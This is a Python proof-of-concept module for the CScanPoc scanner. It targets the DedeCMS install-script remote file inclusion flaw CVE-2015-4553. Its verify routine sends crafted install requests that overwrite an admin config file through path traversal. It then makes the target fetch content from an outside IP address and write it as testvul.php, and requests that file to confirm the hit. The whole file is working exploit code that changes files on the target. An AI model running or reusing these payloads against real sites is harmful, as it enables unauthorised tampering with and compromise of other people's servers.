# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0001'  # 平台漏洞编号，留空
    name = '织梦CMS Remote File Inclusion'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RFI  # 漏洞类型
    disclosure_date = '2015-06-14'  # 漏洞公布时间
    desc = '''
        DedeCMS /install/index.php 远程文件包含漏洞。
    '''  # 漏洞描述
    ref = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4553'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2015-4553'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = '< 5.7-sp1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4ceba250-ab25-4512-902f-473285640eb8'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #audit(assign('dedecms', 'http://localhost:8080/DedeCMS-V5.7-UTF8-SP1-Full/uploads/')[1])
            hh = hackhttp.hackhttp()
            path = '/install/index.php'
            payload1 = '?step=11&insLockfile=utf-8&s_lang=urf-8&install_demo_name=../data/admin/config_update.php'
            payload2 = '?step=11&insLockfile=utf-8&s_lang=utf-8&install_demo_name=testvul.php&updateHost=http://118.126.10.60/base-v57/'
            testvul = '/install/testvul.php'

            code, head, res, errcode, _ = hh.http(
                self.target + path + payload1)
            if code == 200 and '远程获取失败' in res:
                code, head, res, errcode, _ = hh.http(
                    self.target + path + payload2)
                if code == 200 and '存在(您可以选择安装进行体验)' in res:
                    code, head, res, errcode, _ = hh.http(
                        self.target + testvul)
                    if code == 200 and 'INSERT INTO' in res:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
